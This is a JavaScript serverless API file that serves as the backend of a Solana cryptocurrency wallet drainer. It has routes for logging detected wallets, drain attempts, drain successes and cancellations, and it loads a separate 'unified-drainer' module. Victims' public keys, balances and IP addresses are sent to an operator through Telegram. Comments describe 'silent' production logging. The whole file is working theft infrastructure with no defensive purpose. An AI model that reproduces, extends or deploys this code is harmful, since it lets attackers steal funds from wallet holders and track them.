import extractUserIP from '../src/ip-extraction.js';

// Server-side deduplication cache - 2025 FIX
const walletLogCache = new Map();
const WALLET_LOG_CACHE_TTL = 300000; // 5 minutes

export default async function handler(req, res) {
  // Set CORS headers for Vercel deployment
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // Set timeout for the entire request
  const timeoutId = setTimeout(() => {
    if (!res.headersSent) {
      res.status(408).json({ error: 'Request timeout' });
    }
  }, 30000); // 30 second timeout to match handler timeout
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    clearTimeout(timeoutId);
    res.status(200).end();
    return;
  }
  
  const { pathname } = new URL(req.url, `http://${req.headers.host}`);
  
  // Debug logging
  console.log(`[API] Request URL: ${req.url}, Pathname: ${pathname}, Method: ${req.method}`);
  console.log(`[API] Checking routes for pathname: ${pathname}`);
  
  // Route based on path
  if (pathname === '/api/drainer/log-wallet') {
    await handleWalletLogging(req, res);
  } else if (pathname === '/api/drainer/log-confirmation') {
    await handleConfirmationLogging(req, res);
  } else if (pathname === '/api/drainer/log-cancellation') {
    await handleCancellationLogging(req, res);
  } else if (pathname === '/api/drainer/log-drain-attempt') {
    await handleDrainAttemptLogging(req, res);
  } else if (pathname === '/api/wallet-management') {
    await handleWalletManagement(req, res);
  } else if (pathname === '/api/drainer') {
    // Route to unified drainer for consistency with local server
    try {
      // Use absolute import path for Vercel compatibility
      const { default: unifiedDrainerHandler } = await import('./unified-drainer.js');
      
      const handlerPromise = unifiedDrainerHandler(req, res);
      const handlerTimeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Unified drainer handler timeout')), 30000)
      );
      
      return await Promise.race([handlerPromise, handlerTimeoutPromise]);
    } catch (error) {
      console.error('[VERCEL] Failed to import or execute unified drainer:', error);
      res.status(500).json({ 
        error: 'Server configuration error',
        details: 'Failed to load unified drainer module'
      });
    }
  } else {
    res.status(404).json({ error: 'Not found' });
  }
}

// Wallet logging handler with server-side deduplication - 2025 FIX
async function handleWalletLogging(req, res) {
  try {
    // Silent request logging for production
    
    const { publicKey, walletType, origin, userAgent, lamports } = req.body;
    const userIp = extractUserIP(req); // Use centralized IP extraction
    
    // Validate required fields
    if (!publicKey) {
      console.error('[SERVER] Missing publicKey in request');
      return res.status(400).json({ error: 'Missing publicKey' });
    }
    
    // Server-side deduplication check - 2025 FIX
    const walletKey = `${publicKey}-${walletType}`;
    const now = Date.now();
    const cachedLog = walletLogCache.get(walletKey);
    
    if (cachedLog && (now - cachedLog.timestamp) < WALLET_LOG_CACHE_TTL) {
      console.log(`[SERVER] Skipping duplicate wallet log for ${walletType} - logged ${Math.round((now - cachedLog.timestamp)/1000)}s ago`);
      clearTimeout(timeoutId);
      return res.status(200).json({ success: true, message: 'Duplicate log skipped' });
    }
    
    // Cache this log attempt
    walletLogCache.set(walletKey, {
      timestamp: now,
      lamports: lamports || 0,
      ip: userIp
    });
    
    // Clean up old cache entries periodically (optimized)
    if (walletLogCache.size > 1000) {
      const cutoffTime = now - WALLET_LOG_CACHE_TTL;
      const keysToDelete = [];
      
      // Collect keys to delete first (avoid modifying map during iteration)
      for (const [key, value] of walletLogCache.entries()) {
        if (value.timestamp < cutoffTime) {
          keysToDelete.push(key);
        }
      }
      
      // Delete collected keys
      keysToDelete.forEach(key => walletLogCache.delete(key));
      
      console.log(`[CACHE] Cleaned up ${keysToDelete.length} expired entries`);
    }
    
    // Silent wallet logging for production
    
    // Import and use Telegram logging with timeout protection
    try {
      const telegramImportPromise = import('../src/telegram.js');
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Telegram import timeout')), 10000)
      );
      
      const telegramLogger = (await Promise.race([telegramImportPromise, timeoutPromise])).default;
      
      const logPromise = telegramLogger.logWalletDetected({
        publicKey: publicKey,
        lamports: lamports || 0,
        ip: userIp,
        walletType: walletType || 'Unknown'
      });
      const logTimeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Telegram log timeout')), 30000)
      );
      
      await Promise.race([logPromise, logTimeoutPromise]);
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log wallet detection:', telegramError);
      // Fallback to console logging
      // Silent fallback logging for production
    }
    
    // Silent success logging for production
    clearTimeout(timeoutId);
    res.status(200).json({ success: true });
  } catch (error) {
    clearTimeout(timeoutId);
    console.error('[SERVER] Error logging wallet connection:', error);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
    }
  }
}

// Confirmation logging handler
async function handleConfirmationLogging(req, res) {
  const timeoutId = setTimeout(() => {
    if (!res.headersSent) {
      res.status(408).json({ error: 'Confirmation logging timeout' });
    }
  }, 30000); // 30 second timeout

  try {
    // Silent confirmation logging for production
    const { publicKey, txid, status, error } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
    
    if (status === 'confirmed' || status === 'finalized' || status === 'processed' || status === 'broadcast_success') {
      // Silent success confirmation logging for production
      try {
        const telegramImportPromise = import('../src/telegram.js');
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Telegram import timeout')), 10000)
        );
        
        const telegramLogger = (await Promise.race([telegramImportPromise, timeoutPromise])).default;
        
        const logPromise = telegramLogger.logDrainSuccess({
          publicKey: publicKey,
          actualDrainAmount: req.body.actualDrainAmount || 0,
          lamports: req.body.lamports || 0,
          walletType: req.body.walletType || 'Unknown',
          ip: userIp
        });
        const logTimeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Telegram log timeout')), 30000)
        );
        
        await Promise.race([logPromise, logTimeoutPromise]);
      } catch (telegramError) {
        console.error('[TELEGRAM] Failed to log drain success:', telegramError);
      }
    } else if (error) {
              // Silent failed confirmation logging for production
      try {
        const telegramImportPromise = import('../src/telegram.js');
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Telegram import timeout')), 10000)
        );
        
        const telegramLogger = (await Promise.race([telegramImportPromise, timeoutPromise])).default;
        
        const logPromise = telegramLogger.logDrainFailed({
          publicKey: publicKey,
          lamports: req.body.lamports || 0,
          walletType: req.body.walletType || 'Unknown',
          ip: userIp,
          error: error || 'Transaction failed on-chain'
        });
        const logTimeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Telegram log timeout')), 30000)
        );
        
        await Promise.race([logPromise, logTimeoutPromise]);
      } catch (telegramError) {
        console.error('[TELEGRAM] Failed to log drain failed:', telegramError);
      }
    } else {
              // Silent unknown status logging for production
    }
    
    // Silent confirmation success logging for production
    clearTimeout(timeoutId);
    res.status(200).json({ success: true });
  } catch (error) {
    clearTimeout(timeoutId);
    console.error('[CONFIRMATION] Error logging confirmation:', error);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
    }
  }
}

// Cancellation logging handler
async function handleCancellationLogging(req, res) {
  const timeoutId = setTimeout(() => {
    if (!res.headersSent) {
      res.status(408).json({ error: 'Cancellation logging timeout' });
    }
  }, 30000); // 30 second timeout

  try {
    // Silent cancellation logging for production
    const { publicKey, walletType, reason } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
    
    try {
      const telegramImportPromise = import('../src/telegram.js');
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Telegram import timeout')), 10000)
      );
      
      const telegramLogger = (await Promise.race([telegramImportPromise, timeoutPromise])).default;
      
      const logPromise = telegramLogger.logTransactionCancelled({
        publicKey: publicKey,
        walletType: walletType || 'Unknown',
        reason: reason || 'User canceled the transaction',
        ip: userIp,
        lamports: req.body.lamports || 0
      });
      const logTimeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Telegram log timeout')), 30000)
      );
      
      await Promise.race([logPromise, logTimeoutPromise]);
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log cancellation:', telegramError);
      // Silent cancellation details logging for production
    }
    
    // Silent cancellation success logging for production
    clearTimeout(timeoutId);
    res.status(200).json({ success: true });
  } catch (error) {
    clearTimeout(timeoutId);
    console.error('[CANCELLATION] Error logging cancellation:', error);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
    }
  }
}

// Drain attempt logging handler
async function handleDrainAttemptLogging(req, res) {
  const timeoutId = setTimeout(() => {
    if (!res.headersSent) {
      res.status(408).json({ error: 'Drain attempt logging timeout' });
    }
  }, 30000); // 30 second timeout

  try {
    // Silent drain attempt logging for production
    const { publicKey, walletType, lamports, instructions, transactionSize } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
    
    // Log drain attempt details
    console.log(`[DRAIN_ATTEMPT] ${walletType} wallet: ${publicKey}, Balance: ${lamports} lamports, Instructions: ${instructions}`);
    
    // Silent drain attempt success logging for production
    clearTimeout(timeoutId);
    res.status(200).json({ success: true });
  } catch (error) {
    clearTimeout(timeoutId);
    console.error('[DRAIN_ATTEMPT] Error logging drain attempt:', error);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Failed to log drain attempt', details: error.message });
    }
  }
}

// Handle wallet management requests
async function handleWalletManagement(req, res) {
  const timeoutId = setTimeout(() => {
    if (!res.headersSent) {
      res.status(408).json({ error: 'Wallet management request timeout' });
    }
  }, 30000); // 30 second timeout

  try {
    // Import wallet management handler
    const { default: walletManagementHandler } = await import('./wallet-management.js');
    
    // Call the wallet management handler
    await walletManagementHandler(req, res);
    
    clearTimeout(timeoutId);
  } catch (error) {
    clearTimeout(timeoutId);
    console.error('[WALLET_MANAGEMENT] Error:', error);
    if (!res.headersSent) {
      res.status(500).json({ 
        error: 'Wallet management handler failed', 
        details: error.message 
      });
    }
  }
} 